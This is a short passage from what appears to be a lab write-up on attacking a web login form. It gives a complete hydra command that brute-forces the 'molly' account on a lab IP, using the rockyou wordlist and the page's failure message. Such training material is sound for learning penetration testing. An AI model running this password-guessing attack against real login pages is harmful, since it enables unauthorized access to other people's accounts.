## 🛠️ Technical Breakdown

### 1️⃣ Attacking the Web Portal (HTTP-POST)
The most complex part of the lab involves attacking a web form. Unlike simple services, web forms require specific parameters found by inspecting the page source (F12).

> **Scenario:** The target has a login page at `/login`. By inspecting the network traffic, I identified the input fields: `username` and `password`.

**The Attack Command:**
```bash
hydra -l molly \
      -P /usr/share/wordlists/rockyou.txt \
      10.10.154.209 http-post-form \
      "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect."
